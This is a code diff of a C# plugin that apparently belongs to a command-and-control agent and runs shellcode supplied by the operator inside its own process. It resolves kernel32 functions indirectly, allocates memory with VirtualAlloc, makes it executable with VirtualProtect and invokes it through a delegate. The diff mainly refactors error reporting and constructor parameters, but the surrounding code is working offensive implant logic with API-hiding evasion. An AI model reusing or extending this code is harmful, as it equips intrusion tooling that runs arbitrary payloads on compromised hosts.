@@ -36,12 +36,9 @@ namespace Agent
         private delegate IntPtr CFDelegate(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
 
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        private string output_task_id { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
@@ -54,15 +51,18 @@ namespace Agent
 
             if (!Resolver.TryResolveFuncs(resolvFuncs, "k32", out var err))
             {
-                await messageManager.WriteLine(err, job.task.id, true, "error");
+                messageManager.WriteLine(err, job.task.id, true, "error");
                 return;
             }
 
             ShellcodeArgs args = JsonSerializer.Deserialize<ShellcodeArgs>(job.task.parameters);
-
+            if(args is null){
+                return;
+            }
+            
             if (!args.Validate())
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = "Missing Shellcode Bytes",
@@ -79,7 +79,7 @@ namespace Agent
 
             if (bufAddr == IntPtr.Zero)
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = $"err VirtualAlloc ({Marshal.GetLastPInvokeError()})",
@@ -97,7 +97,7 @@ namespace Agent
             bool result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vp"), typeof(VPDelegate), ref vpParams);
             if (!result)
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = true,
                     user_output = $"err VirtualProtect ({Marshal.GetLastPInvokeError()})",
@@ -113,12 +113,12 @@ namespace Agent
             {
                 shellcodeDelegate.Invoke();
             }
-            catch
+            catch(Exception e)
             {
-                await messageManager.AddResponse(new TaskResponse()
+                messageManager.AddTaskResponse(new TaskResponse()
                 {
                     completed = false,
-                    process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                    user_output = e.ToString(),
                     task_id = job.task.id,
                     status = "error"
                 });
